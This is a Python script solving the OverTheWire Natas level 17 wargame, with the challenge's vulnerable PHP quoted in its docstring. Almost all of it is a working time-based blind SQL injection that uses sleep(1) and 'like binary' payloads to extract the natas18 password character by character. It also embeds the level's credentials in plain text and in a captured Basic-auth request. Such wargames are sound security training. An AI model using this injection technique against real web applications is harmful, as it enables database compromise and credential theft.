'''
Created on Aug 22, 2018

source: https://www.abatchy.com/2016/11/natas-level-14-and-15

source code for web page:
/*
CREATE TABLE users (
  username varchar(64) DEFAULT NULL,
  password varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
'''

import requests
from requests.auth import HTTPBasicAuth

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
chars_in_passwd = list("")
passwd = list("")

# Find chars appearing in password
for char in chars:    
    hack = "natas18\" and password like binary \"%{0}%\" and sleep(1)#".format(char) #binary: MySQL's way to make case sensitive
    my_data = {"username": hack}       
    r = requests.post("http://natas17.natas.labs.overthewire.org/index.php?debug", 
                      data=my_data, 
                      auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))

    if (r.elapsed.total_seconds() >= 1):
        chars_in_passwd.append(char)
        print("".join(chars_in_passwd))

# Find password
for i in range(0, 32):
    for char in chars_in_passwd:
        if len(passwd) == i:
            passwd.append(char)
        else:
            passwd[i] = char
         
        passwd_str = "".join(passwd)
        hack = "natas18\" and password like binary \"{0}%\" and sleep(1)#".format(passwd_str) #binary: MySQL's way to make case sensitive
        my_data = {"username": hack}       
        r = requests.post("http://natas17.natas.labs.overthewire.org/index.php?debug", 
                          data=my_data, 
                          auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
        
        if (r.elapsed.total_seconds() >= 1):
            break
             
    print("".join(passwd))
        
# REQUEST
# POST /index.php?debug HTTP/1.1
# Host: natas17.natas.labs.overthewire.org
# User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Referer: http://natas17.natas.labs.overthewire.org/
# Cookie: __cfduid=dfc19891ef710d8915a1f14a600ae2b271534787266; __utma=176859643.1042007831.1534787267.1534795773.1534850371.3; __utmz=176859643.1534787267.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)
# Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==
# Connection: close
# Upgrade-Insecure-Requests: 1
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 55
# 
# username=natas18
